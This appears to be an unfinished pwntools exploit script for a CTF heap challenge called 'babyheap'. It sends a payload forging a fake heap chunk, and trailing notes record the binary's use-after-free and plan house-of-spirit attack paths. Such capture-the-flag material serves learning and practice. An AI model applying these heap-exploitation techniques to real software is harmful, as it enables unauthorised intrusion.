#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyheap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def new(size, data, name):
    	r.sendline("1")
    	r.sendline(str(size))
    	r.send(data)
    	r.send(name)

    def delete():
    	r.sendline("2")

    def edit(data):
    	r.sendline("3")
    	r.send(data)

    def exit(confirmation):
    	r.sendline("4")
    	r.send(confirmation)

    exit("n" + "A"*4064 + p64(0) + p64(0x71))

    #r.send("\n")
    #new(0x60, "A"*0x60, "dead")
    
    #edit(p64(0) + p64(0x91) + p64(0)*3 + p64(0x71))
    gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
new
	- checks if CHUNK_006020b0 is empty or not
	- if not empty, malloc(0x18)
	- asks for size and puts it in [0]
	- malloc(our_size) and puts it in [2]
	- content - off-by-one?
	- name is written at [1]

delete
	- frees my chunk
	- frees that chunk
	- clears that chunk's ptr but not mine!!!!!!!!!!
	- chunk recycling !!!!!!!!!!!!!!!
	- can only free once??????

edit
	- can edit only once?

WTF0_006020a4 # renew
WTF1_006020a8 # free
CHUNK_006020b0

malloc1 edit free malloc2 -> arbitrary free -> house of spirit
malloc1 free malloc2 edit -> uaf

'''